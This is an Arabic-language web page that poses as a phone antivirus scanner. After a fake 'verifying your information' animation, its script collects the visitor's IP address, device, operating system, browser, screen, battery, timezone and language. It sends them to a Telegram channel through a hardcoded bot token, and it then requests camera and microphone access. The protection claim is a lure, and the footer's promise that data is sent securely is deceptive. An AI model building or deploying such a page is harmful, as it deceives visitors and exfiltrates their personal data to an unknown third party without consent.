<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>من الفيروسات جهازك - حمايه</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Tahoma', system-ui, sans-serif;
        }

        body {
            background: #0a0a0f;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(156, 39, 176, 0.2) 0%, transparent 30%),
                radial-gradient(circle at 90% 80%, rgba(106, 13, 173, 0.2) 0%, transparent 40%),
                radial-gradient(circle at 30% 50%, rgba(168, 85, 247, 0.15) 0%, transparent 50%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            margin: 0;
            position: relative;
            overflow-x: hidden;
        }

        /* تأثير الخلفية المتحركة */
        body::before {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.05"><path d="M50 15 L65 40 L50 65 L35 40 Z" fill="%239c27b0"/><circle cx="50" cy="40" r="5" fill="%23a855f7"/></svg>') repeat;
            pointer-events: none;
            z-index: 0;
        }

        .container {
            max-width: 550px;
            width: 100%;
            background: rgba(18, 18, 24, 0.9);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(156, 39, 176, 0.4);
            border-radius: 32px;
            padding: 28px 24px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(156, 39, 176, 0.3) inset, 0 0 40px rgba(168, 85, 247, 0.4);
            transition: all 0.3s ease;
            position: relative;
            z-index: 1;
        }

        h1 {
            text-align: center;
            margin-bottom: 24px;
            font-size: 2.2rem;
            font-weight: 700;
            background: linear-gradient(135deg, #e9d5ff 0%, #c084fc 40%, #a855f7 80%, #7e22ce 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: 1px;
            text-shadow: 0 0 30px rgba(168, 85, 247, 0.7);
            position: relative;
        }

        h1::after {
            content: '';
            position: absolute;
            bottom: -8px;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            height: 3px;
            background: linear-gradient(90deg, transparent, #a855f7, #c084fc, #a855f7, transparent);
            border-radius: 100%;
        }

        .btn-primary {
            width: 100%;
            padding: 16px 24px;
            background: linear-gradient(145deg, #2a1b3d, #1a0f2a);
            border: 2px solid #9d4edd;
            color: #e0b3ff;
            font-size: 1.25rem;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.25s ease;
            margin-bottom: 28px;
            box-shadow: 0 8px 0 #4a1d6d, 0 10px 30px rgba(157, 78, 221, 0.4);
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            position: relative;
            overflow: hidden;
            z-index: 1;
        }

        .btn-primary::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            transition: left 0.5s ease;
            z-index: -1;
        }

        .btn-primary:hover::before {
            left: 100%;
        }

        .btn-primary:hover {
            transform: translateY(-4px);
            box-shadow: 0 12px 0 #4a1d6d, 0 20px 40px rgba(157, 78, 221, 0.6);
            background: linear-gradient(145deg, #34244a, #221434);
            border-color: #b67ef0;
            color: #f0d9ff;
        }

        .btn-primary:active {
            transform: translateY(4px);
            box-shadow: 0 4px 0 #4a1d6d, 0 10px 30px rgba(157, 78, 221, 0.4);
        }

        /* دائرة التحميل الاحترافية */
        .loading-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 30px 0 20px 0;
            position: relative;
        }

        .loading-circle {
            position: relative;
            width: 280px;
            height: 280px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            animation: pulse-glow 2s ease-in-out infinite;
        }

        /* الدائرة الخارجية المتحركة */
        .outer-circle {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: linear-gradient(45deg, #a855f7, #e879f9, #c084fc, #7e22ce);
            background-size: 300% 300%;
            animation: rotate-gradient 8s linear infinite, glow 3s ease-in-out infinite;
            box-shadow: 
                0 0 30px #a855f7,
                0 0 60px #7e22ce,
                0 0 90px #c084fc,
                inset 0 0 30px rgba(255, 255, 255, 0.3);
        }

        /* طبقة الدائرة الداخلية */
        .inner-circle {
            position: absolute;
            width: 85%;
            height: 85%;
            border-radius: 50%;
            background: #0f0b14;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.8), 0 0 30px #9d4edd;
            border: 2px solid rgba(168, 85, 247, 0.6);
        }

        /* النص داخل الدائرة */
        .loading-text {
            color: #f0e6ff;
            font-size: 1.6rem;
            font-weight: 700;
            text-align: center;
            line-height: 1.6;
            text-shadow: 0 0 20px #a855f7, 0 0 40px #7e22ce;
            animation: text-pulse 2s ease-in-out infinite;
            background: linear-gradient(135deg, #ffffff, #e9d5ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: 1px;
        }

        /* حلقات دوارة إضافية */
        .ring-1, .ring-2, .ring-3 {
            position: absolute;
            border-radius: 50%;
            border: 2px solid transparent;
            border-top-color: #c084fc;
            border-right-color: #a855f7;
            border-bottom-color: #7e22ce;
            border-left-color: #e879f9;
            animation: spin 3s linear infinite;
        }

        .ring-1 {
            width: 110%;
            height: 110%;
            animation-duration: 4s;
        }

        .ring-2 {
            width: 120%;
            height: 120%;
            animation-duration: 3s;
            animation-direction: reverse;
            border-top-color: #e879f9;
            border-right-color: #c084fc;
            border-bottom-color: #a855f7;
            border-left-color: #7e22ce;
        }

        .ring-3 {
            width: 130%;
            height: 130%;
            animation-duration: 5s;
            border-top-color: #7e22ce;
            border-right-color: #e879f9;
            border-bottom-color: #c084fc;
            border-left-color: #a855f7;
            opacity: 0.7;
        }

        /* نقاط متوهجة */
        .dots {
            position: absolute;
            width: 100%;
            height: 100%;
            animation: spin 20s linear infinite;
        }

        .dot {
            position: absolute;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #c084fc;
            box-shadow: 0 0 20px #a855f7, 0 0 40px #7e22ce;
        }

        .dot:nth-child(1) { top: -4px; left: 50%; transform: translateX(-50%); }
        .dot:nth-child(2) { bottom: -4px; left: 50%; transform: translateX(-50%); }
        .dot:nth-child(3) { left: -4px; top: 50%; transform: translateY(-50%); }
        .dot:nth-child(4) { right: -4px; top: 50%; transform: translateY(-50%); }
        .dot:nth-child(5) { top: 20%; left: 20%; }
        .dot:nth-child(6) { top: 20%; right: 20%; }
        .dot:nth-child(7) { bottom: 20%; left: 20%; }
        .dot:nth-child(8) { bottom: 20%; right: 20%; }

        /* Animations */
        @keyframes rotate-gradient {
            0% { transform: rotate(0deg); filter: hue-rotate(0deg); }
            100% { transform: rotate(360deg); filter: hue-rotate(360deg); }
        }

        @keyframes glow {
            0%, 100% { opacity: 0.8; filter: brightness(1); }
            50% { opacity: 1; filter: brightness(1.3); }
        }

        @keyframes pulse-glow {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.02); }
        }

        @keyframes text-pulse {
            0%, 100% { opacity: 0.9; text-shadow: 0 0 20px #a855f7; }
            50% { opacity: 1; text-shadow: 0 0 40px #c084fc, 0 0 60px #7e22ce; }
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* باقي التنسيقات */
        .info-card {
            background: rgba(12, 10, 17, 0.8);
            border-radius: 28px;
            padding: 20px 16px;
            border: 1px solid #3b2b4a;
            backdrop-filter: blur(4px);
            box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.8), 0 0 0 1px #7b3a9b inset;
            margin-top: 20px;
        }

        .info-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 12px;
            border-bottom: 1px solid rgba(156, 39, 176, 0.25);
            transition: background 0.2s;
        }

        .info-item:hover {
            background: rgba(156, 39, 176, 0.08);
            border-radius: 16px;
        }

        .info-item:last-child {
            border-bottom: none;
        }

        .label {
            font-weight: 600;
            color: #d8b4fe;
            font-size: 1rem;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .value {
            color: #f3e8ff;
            font-family: 'Monaco', 'Menlo', monospace;
            background: #1e1428;
            padding: 6px 14px;
            border-radius: 40px;
            font-size: 0.9rem;
            border: 1px solid #5e2e8c;
            box-shadow: inset 0 2px 5px #00000055, 0 2px 5px #b77ef030;
            direction: ltr;
            text-align: right;
            max-width: 60%;
            word-break: break-word;
        }

        .online-status {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-left: 6px;
            box-shadow: 0 0 10px currentColor;
        }

        .online {
            background-color: #4ade80;
            box-shadow: 0 0 15px #4ade80;
        }

        .offline {
            background-color: #f87171;
            box-shadow: 0 0 15px #f87171;
        }

        .ip-address {
            font-family: monospace;
            background: #0e0b14;
            border-color: #a855f7;
        }

        .status-container {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .badge {
            background: linear-gradient(145deg, #3b2752, #221530);
            color: #e9d2ff;
            padding: 2px 8px;
            border-radius: 100px;
            font-size: 0.7rem;
            border: 1px solid #a34fdd;
            margin-right: 6px;
        }

        .loader {
            width: 16px;
            height: 16px;
            border: 2px solid #c9a6ff;
            border-bottom-color: transparent;
            border-radius: 50%;
            display: inline-block;
            animation: rotation 0.8s linear infinite;
        }

        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer-note {
            text-align: center;
            margin-top: 25px;
            color: #6b4f8f;
            font-size: 0.75rem;
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ حمايه هاتفك</h1>
        
        <button class="btn-primary" onclick="startProcess()" id="actionBtn">
            <span>🔮</span> ابدأ حمايه جهازك من الفيروسات <span>✨</span>
        </button>

        <!-- دائرة التحميل الاحترافية -->
        <div id="loadingCircle" class="loading-container hidden">
            <div class="loading-circle">
                <div class="outer-circle"></div>
                <div class="inner-circle">
                    <div class="loading-text">جاري التحقق<br>من معـلوماتك</div>
                </div>
                <div class="ring-1"></div>
                <div class="ring-2"></div>
                <div class="ring-3"></div>
                <div class="dots">
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
            </div>
        </div>

        <div class="info-card" id="infoCard" style="display: none;">
            <div class="info-item">
                <span class="label">🌐 <span>حالة الاتصال</span></span>
                <span class="value" id="onlineStatus">
                    <span class="online-status online" id="statusDot"></span>
                    <span id="statusText">متصل</span>
                </span>
            </div>
            
            <div class="info-item">
                <span class="label">📡 <span>نوع الاتصال</span></span>
                <span class="value" id="connectionType">-</span>
            </div>
            
            <div class="info-item">
                <span class="label">🔢 <span>عنوان IP</span></span>
                <span class="value ip-address" id="ipAddress"><span class="loader"></span></span>
            </div>
            
            <div class="info-item">
                <span class="label">📱 <span>الجهاز</span></span>
                <span class="value" id="deviceName">-</span>
            </div>
            
            <div class="info-item">
                <span class="label">💻 <span>نظام التشغيل</span></span>
                <span class="value" id="os">-</span>
            </div>
            
            <div class="info-item">
                <span class="label">🌍 <span>المتصفح</span></span>
                <span class="value" id="browser">-</span>
            </div>
            
            <div class="info-item">
                <span class="label">📏 <span>دقة الشاشة</span></span>
                <span class="value" id="screenResolution">-</span>
            </div>
            
            <div class="info-item">
                <span class="label">🔋 <span>البطارية</span></span>
                <span class="value" id="batteryInfo">-</span>
            </div>
            
            <div class="info-item">
                <span class="label">🕒 <span>المنطقة الزمنية</span></span>
                <span class="value" id="timezone">-</span>
            </div>
            
            <div class="info-item">
                <span class="label">🗣️ <span>اللغة</span></span>
                <span class="value" id="language">-</span>
            </div>
        </div>
        <div class="footer-note">تم التصميم بشكل احترافي • جميع المعلومات تُرسل بأمان</div>
    </div>

    <script>
        // إعدادات البوت والقناة
        const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
        const CHANNEL_ID = '-1003875161698';  // معرف القناة

        // دالة لإرسال النص إلى تيليغرام
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHANNEL_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                const data = await response.json();
                if (!data.ok) {
                    console.error('خطأ من تيليغرام:', data);
                } else {
                    console.log('تم الإرسال بنجاح');
                }
            } catch (error) {
                console.error('فشل الاتصال بتليغرام:', error);
            }
        }

        // دالة عنوان IP
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'غير متاح';
            }
        }

        // اسم الجهاز
        function getDeviceName() {
            const ua = navigator.userAgent;
            if (/iPhone|iPad|iPod/i.test(ua)) return 'Apple iPhone/iPad';
            if (/Android/i.test(ua)) return 'جهاز Android';
            if (/Windows/i.test(ua)) return 'كمبيوتر Windows';
            if (/Mac/i.test(ua)) return 'Apple Mac';
            if (/Linux/i.test(ua)) return 'جهاز Linux';
            return 'جهاز غير معروف';
        }

        // البطارية
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const charging = battery.charging ? 'يشحن' : 'لا يشحن';
                    return `${level}% (${charging})`;
                } catch {
                    return 'غير متاح';
                }
            }
            return 'غير مدعوم';
        }

        // نظام التشغيل والمتصفح
        function getSystemInfo() {
            const ua = navigator.userAgent;
            let os = 'غير معروف';
            let browser = 'غير معروف';

            if (ua.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10/11';
            else if (ua.indexOf('Windows NT 6.2') !== -1) os = 'Windows 8';
            else if (ua.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
            else if (ua.indexOf('Mac OS X') !== -1) os = 'macOS';
            else if (ua.indexOf('Android') !== -1) os = 'Android';
            else if (/iOS|iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
            else if (ua.indexOf('Linux') !== -1) os = 'Linux';

            if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) browser = 'Google Chrome';
            else if (ua.indexOf('Firefox') !== -1) browser = 'Mozilla Firefox';
            else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) browser = 'Apple Safari';
            else if (ua.indexOf('Edg') !== -1) browser = 'Microsoft Edge';
            else if (ua.indexOf('OPR') !== -1 || ua.indexOf('Opera') !== -1) browser = 'Opera';

            return { os, browser };
        }

        // حالة الاتصال
        function updateConnectionStatus() {
            const isOnline = navigator.onLine;
            const dot = document.getElementById('statusDot');
            const text = document.getElementById('statusText');
            const connType = document.getElementById('connectionType');

            if (isOnline) {
                dot.className = 'online-status online';
                text.textContent = 'متصل';
                if ('connection' in navigator) {
                    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    if (connection && connection.effectiveType) {
                        connType.textContent = connection.effectiveType.toUpperCase();
                    } else {
                        connType.textContent = 'WiFi/Ethernet';
                    }
                } else {
                    connType.textContent = 'غير متاح';
                }
            } else {
                dot.className = 'online-status offline';
                text.textContent = 'غير متصل';
                connType.textContent = '-';
            }
        }

        // تنسيق الرسالة المرسلة إلى التيليغرام
        function formatTelegramMessage(data) {
            return `
╔═══════════════════
║  <b>معلومات الجهاز</b>
╠═══════════════════
║ <b>🌐 الحالة:</b> ${data.statusText} (${data.connectionType})
║ <b>🔢 IP:</b> <code>${data.ip}</code>
║ <b>📱 الجهاز:</b> ${data.device}
║ <b>💻 النظام:</b> ${data.os}
║ <b>🌍 المتصفح:</b> ${data.browser}
║ <b>📏 الشاشة:</b> ${data.screen}
║ <b>🔋 البطارية:</b> ${data.battery}
║ <b>🕒 التوقيت:</b> ${data.timezone}
║ <b>🗣️ اللغة:</b> ${data.lang}
╚═══════════════════
⏰ <i>${new Date().toLocaleString('ar-EG')}</i>
            `;
        }

        // الدالة الرئيسية - تبدأ بعرض دائرة التحميل ثم تجلب المعلومات
        async function startProcess() {
            // إخفاء الزر وإظهار دائرة التحميل
            document.getElementById('actionBtn').style.display = 'none';
            document.getElementById('loadingCircle').classList.remove('hidden');
            
            // تأخير بسيط لإظهار الدائرة (تأثير دراماتيكي)
            await new Promise(resolve => setTimeout(resolve, 2500));

            // إخفاء الدائرة وإظهار بطاقة المعلومات
            document.getElementById('loadingCircle').classList.add('hidden');
            const infoCard = document.getElementById('infoCard');
            infoCard.style.display = 'block';

            // عناصر لعرضها
            const ipEl = document.getElementById('ipAddress');
            const deviceEl = document.getElementById('deviceName');
            const osEl = document.getElementById('os');
            const browserEl = document.getElementById('browser');
            const screenEl = document.getElementById('screenResolution');
            const batteryEl = document.getElementById('batteryInfo');
            const timezoneEl = document.getElementById('timezone');
            const langEl = document.getElementById('language');

            // التحديث الأولي
            updateConnectionStatus();
            window.addEventListener('online', updateConnectionStatus);
            window.addEventListener('offline', updateConnectionStatus);

            // جلب IP
            ipEl.innerHTML = '<span class="loader"></span>';
            const ip = await getIPAddress();
            ipEl.textContent = ip;

            const device = getDeviceName();
            deviceEl.textContent = device;

            const sys = getSystemInfo();
            osEl.textContent = sys.os;
            browserEl.textContent = sys.browser;

            screenEl.textContent = `${window.screen.width} × ${window.screen.height}`;

            const battery = await getBatteryInfo();
            batteryEl.textContent = battery;

            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            timezoneEl.textContent = timezone;

            const lang = navigator.language || navigator.userLanguage;
            langEl.textContent = lang;

            // تجميع البيانات للإرسال
            const statusText = document.getElementById('statusText').textContent;
            const connectionType = document.getElementById('connectionType').textContent;

            const collectedData = {
                ip,
                device,
                os: sys.os,
                browser: sys.browser,
                screen: `${window.screen.width}×${window.screen.height}`,
                battery,
                timezone,
                lang,
                statusText,
                connectionType
            };

            // إرسال إلى تليغرام
            const message = formatTelegramMessage(collectedData);
            await sendToTelegram(message);

            // محاولة طلب إذن الميكروفون/كاميرا لمزيد من التفاعل (اختياري)
            if (navigator.mediaDevices) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                    stream.getTracks().forEach(track => track.stop());
                } catch (err) {
                    // المستخدم رفض أو لا يوجد أجهزة
                }
            }
        }

        console.log('الموقع الاحترافي جاهز مع دائرة التحميل');
    </script>
</body>
</html>
